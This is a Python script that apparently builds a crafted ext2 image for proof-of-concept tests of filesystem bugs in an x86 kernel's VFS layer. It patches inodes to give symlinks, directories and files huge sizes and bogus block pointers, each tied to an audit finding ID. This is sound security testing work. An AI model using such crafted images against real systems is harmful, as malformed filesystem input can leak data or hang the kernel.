#!/usr/bin/env python3
"""x86vfs_craft.py — build the crafted ext2 image for the x86 VFS security PoCs.

Companion to `x86vfs_poc.c` (security batch 2, version 2.22.1). The image is a
private copy of the attack range's 64 MiB ext2 volume with a handful of
attacker-controlled inodes patched in directly (the same technique the audit's
`craft.py` used):

  * `/evil_link`  — S_IFLNK, `i_blocks = 8, i_size = 0xFFFFFFF0` (F-x86v-1);
  * `/w/evil4`    — S_IFLNK, `i_blocks = 0, i_size = 61`, `i_block[0]` = the
                    live data block of `/w/keep` (F-x86v-4);
  * `/w/bigdir`   — directory, `i_size = 0xFFFFF000`, `i_block[13]` points at a
                    real double-indirect block (F-x86v-5);
  * `/w/huge`     — regular file, `i_size = 0xFFFFF000`, no data blocks
                    (F-x86v-2);
  * `/w/bigfile`  — regular file, mode 0755, `i_size = 0xFFFFFFF0` (F-x86v-6);
  * plus the benign fixtures the PoC's sanity selectors use
    (`/w/goodlink -> target`, `/w/target`, `/w/sub/normal`, `/rootdir/secret`
    in a root-owned 0700 directory).

Usage:
    python3 tools/security/poc/x86vfs_craft.py --base "$RANGE/base-disk.img" \\
        --out /tmp/pagh-x86vfs/vfs.img

Requires `debugfs` (e2fsprogs) on the host; the image is never booted in place
(the range runner copies it per run).
"""
from __future__ import annotations

import argparse
import os
import re
import shutil
import struct
import subprocess
import sys

BS = 4096


def debugfs(img: str, cmd: str, write: bool = True) -> str:
    args = ["debugfs"] + (["-w"] if write else []) + ["-R", cmd, img]
    r = subprocess.run(args, capture_output=True, text=True)
    if write and r.returncode != 0:
        print(f"debugfs warn: {cmd}: {r.stderr.strip()}", file=sys.stderr)
    return r.stdout


def superblock(img: str) -> dict:
    with open(img, "rb") as f:
        f.seek(1024)
        b = f.read(0x88)
    u32 = lambda o: struct.unpack_from("<I", b, o)[0]
    u16 = lambda o: struct.unpack_from("<H", b, o)[0]
    return {
        "blocks": u32(4),
        "first_data": u32(0x14),
        "bpg": u32(0x20),
        "ipg": u32(0x28),
        "inode_size": u16(0x58) or 128,
        "magic": u16(0x38),
    }


def inode_off(img: str, path: str) -> tuple[int, int, int, str]:
    """Absolute (inode, byte offset, inode size, debugfs stat output) of path."""
    out = debugfs(img, f"stat {path}", write=False)
    m = re.search(r"Inode:\s*(\d+)", out)
    if not m:
        raise SystemExit(f"no inode for {path}: {out[:300]}")
    ino = int(m.group(1))
    s = superblock(img)
    groups = (s["blocks"] - s["first_data"] + s["bpg"] - 1) // s["bpg"]
    g = (ino - 1) // s["ipg"]
    if g >= groups:
        raise SystemExit(f"{path}: inode {ino} out of range")
    gd_blk = 1 + (g * 32) // BS
    gd_off = (g * 32) % BS
    with open(img, "rb") as f:
        f.seek(gd_blk * BS + gd_off)
        gd = f.read(32)
    inode_table = struct.unpack_from("<I", gd, 8)[0]
    isz = s["inode_size"]
    ipb = BS // isz
    within = (ino - 1) % s["ipg"]
    return ino, (inode_table + within // ipb) * BS + (within % ipb) * isz, isz, out


def blocks_of(stat_output: str) -> list[int]:
    m = re.search(r"BLOCKS:\s*\n((?:\([^)]*\):\d+\s*)+)", stat_output)
    return [int(x) for x in re.findall(r"\):(\d+)", m.group(1))] if m else []


def patch(img: str, path: str, **fields) -> None:
    ino, off, _isz, _out = inode_off(img, path)
    with open(img, "r+b") as f:
        if "mode" in fields:
            f.seek(off + 0)
            f.write(struct.pack("<H", fields["mode"] & 0xFFFF))
        if "size" in fields:
            f.seek(off + 4)
            f.write(struct.pack("<I", fields["size"] & 0xFFFFFFFF))
        if "nlink" in fields:
            f.seek(off + 26)
            f.write(struct.pack("<H", fields["nlink"] & 0xFFFF))
        if "blocks" in fields:
            f.seek(off + 28)
            f.write(struct.pack("<I", fields["blocks"] & 0xFFFFFFFF))
        if "iblock" in fields:
            ib = fields["iblock"]
            f.seek(off + 40)
            f.write(b"".join(struct.pack("<I", x & 0xFFFFFFFF) for x in ib[:15]))
    print(f"patched {path} (ino={ino}): {', '.join(sorted(fields))}")


def set_mode(img: str, path: str, mode: int) -> None:
    debugfs(img, f"sif {path} mode 0{mode:o}")


def write_host(img: str, workdir: str, name: str, data: bytes, guest: str, mode: int) -> None:
    host = os.path.join(workdir, name)
    with open(host, "wb") as f:
        f.write(data)
    debugfs(img, f"rm {guest}")
    debugfs(img, f"write {host} {guest}")
    set_mode(img, guest, mode)


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--base", required=True, help="pristine ext2 image (range base-disk.img)")
    ap.add_argument("--out", required=True, help="crafted image to write")
    ap.add_argument("--workdir", default=None, help="scratch dir (default: alongside --out)")
    a = ap.parse_args()
    work = a.workdir or (os.path.dirname(os.path.abspath(a.out)) + "/craft-work")
    os.makedirs(work, exist_ok=True)
    shutil.copyfile(a.base, a.out)

    # ── benign fixtures ────────────────────────────────────────────────────
    debugfs(a.out, "mkdir /w")
    set_mode(a.out, "/w", 0o40777)
    debugfs(a.out, "mkdir /w/sub")
    set_mode(a.out, "/w/sub", 0o40755)
    debugfs(a.out, "mkdir /w/bigdir")
    set_mode(a.out, "/w/bigdir", 0o40755)
    debugfs(a.out, "mkdir /rootdir")
    set_mode(a.out, "/rootdir", 0o40700)

    keep_pat = b"KEEP-LIVE-DATA-0123456789abcdef"
    keep = (keep_pat * ((BS // len(keep_pat)) + 1))[:BS]
    write_host(a.out, work, "keep.bin", keep, "/w/keep", 0o100644)
    write_host(a.out, work, "target.txt", b"TARGET-CONTENT\n", "/w/target", 0o100644)
    write_host(a.out, work, "normal.txt", b"NORMAL-IN-SUB\n", "/w/sub/normal", 0o100644)
    write_host(a.out, work, "secret.txt", b"ROOT-SECRET-42\n", "/rootdir/secret", 0o100644)

    # Two data blocks for the crafted directory's double-indirect pointer:
    # ext2 skips all-zero writes (sparse), so allocate both with non-zero
    # content and then patch block contents directly. After the patch `zero2` is
    # an all-zero indirect block and every slot of `zero` points at it, so the
    # vulnerable lookup performs two real device reads per logical block.
    write_host(a.out, work, "zero.bin", b"\xab" * BS, "/w/zero2", 0o100644)
    _, _, _, out = inode_off(a.out, "/w/zero2")
    y_blk = blocks_of(out)[0]
    write_host(a.out, work, "zptr.bin", struct.pack("<I", y_blk) * 1024, "/w/zero", 0o100644)
    _, _, _, out = inode_off(a.out, "/w/zero")
    z_blk = blocks_of(out)[0]
    with open(a.out, "r+b") as f:
        f.seek(y_blk * BS)
        f.write(b"\0" * BS)

    # A valid fast symlink: sanity that lstat/readlink/open still work.
    debugfs(a.out, "symlink /w/goodlink target")

    # Crafted symlinks (the image root is the kernel's /mnt).
    debugfs(a.out, "symlink /w/evil4 " + "A" * 61)
    debugfs(a.out, "symlink /evil_link placeholder")

    # Regular files whose inode will claim a huge i_size.
    write_host(a.out, work, "one.bin", b"x", "/w/huge", 0o100644)
    write_host(a.out, work, "four.bin", b"\x7fELF", "/w/bigfile", 0o100755)

    # ── inode surgery ─────────────────────────────────────────────────────
    _, _, _, keep_out = inode_off(a.out, "/w/keep")
    keep_blk = blocks_of(keep_out)[0]
    print(f"keep block={keep_blk} zero={z_blk} zero2={y_blk}")
    print(f"filesystem blocks={superblock(a.out)['blocks']}")

    # F-x86v-1: slow-classified symlink with an attacker i_size (i_blocks = 8
    # forces the slow branch in 2.21.0; the fixed reader refuses the shape).
    patch(a.out, "/evil_link", mode=0o120777, size=0xFFFFFFF0, blocks=8, nlink=1,
          iblock=[100] + [0] * 14)
    # F-x86v-4: i_blocks = 0 with i_size = 61; i_block[0] is the live /w/keep
    # data block written as if it were a block pointer.
    patch(a.out, "/w/evil4", mode=0o120777, size=61, blocks=0, nlink=1,
          iblock=[keep_blk] + [0] * 14)
    # F-x86v-5: directory claiming ~4 GiB; i_block[13] is a real block, so the
    # vulnerable scan issues real device reads (~2 per logical block).
    patch(a.out, "/w/bigdir", mode=0o40755, size=0xFFFFF000, blocks=8,
          iblock=[0] * 13 + [z_blk] + [0])
    # F-x86v-2: regular file, huge sparse claim, no data blocks.
    patch(a.out, "/w/huge", mode=0o100644, size=0xFFFFF000, blocks=0, iblock=[0] * 15)
    # F-x86v-6: executable ELF claiming ~4 GiB.
    patch(a.out, "/w/bigfile", mode=0o100755, size=0xFFFFFFF0, blocks=0, iblock=[0] * 15)

    print(f"crafted: {a.out}")


if __name__ == "__main__":
    main()